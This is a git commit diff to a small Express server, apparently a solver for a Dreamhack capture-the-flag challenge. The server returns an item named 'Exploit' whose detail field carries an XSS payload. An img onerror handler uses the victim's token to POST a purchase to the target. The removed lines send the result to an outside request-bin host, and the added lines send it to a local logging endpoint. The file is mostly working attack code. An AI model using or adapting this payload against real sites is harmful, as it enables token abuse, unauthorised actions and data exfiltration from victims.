0b7b852c8d229f614b4ae3f1d9c2fa97a89c19f9
alstjd223 <13hj45@gmail.com>
2024-12-03 08:27:00 +0900

    제발

--- index.js
+++ index.js
@@ -5,36 +5,27 @@ const cors = require('cors');
 app.use(cors());
 
 const PORT = 4000;
-const url = "http://host3.dreamhack.games:13018";
-const rqb = "https://tccbwmp.request.dreamhack.games";
+const url = "http://localhost:3000";
+const serverLogUrl = "http://localhost:4000";
 
 app.use(express.json());
 
-app.use((req, res, next) => {
-    console.log(`${req.method} 요청을 받았습니다. 경로: ${req.originalUrl}`);
-
-    res.send = function (body) {
-        console.log('응답 내용:', body);
-        res._sent = true;
-    };
-
-    res.on('finish', () => {
-        if (!res._sent) {
-            console.log('응답이 전송되지 않았습니다.');
-        }
-    });
-
-    next();
+app.post('/log', (req, res) => {
+    const data = req.body.data;
+    console.log('서버로부터 받은 data:', data);
+    res.send('서버 로그에 출력됨');
 });
 
 app.get('/info', (req, res) => {
     const token = req.headers['token'];
 
+    const detailWithFetch = `${`<div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => { fetch("${serverLogUrl}/log", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({data: data.data})}) })'/>${`</div>`.repeat(512)}`;
+
     const items = {
         "id": 5,
         "name": "Exploit",
         "price": 9,
-        "detail": `${`<div>`.repeat(512)}<img src='' onerror='fetch("${url}/4/buy", {method: "POST",headers: {"Content-Type": "application/json","token": "${token}"}}).then(response => response.json()).then(data => {fetch("${rqb}/"+data.data)})'/>${`</div>`.repeat(512)}`,
+        "detail": detailWithFetch,
         "poster": ""
     };
 
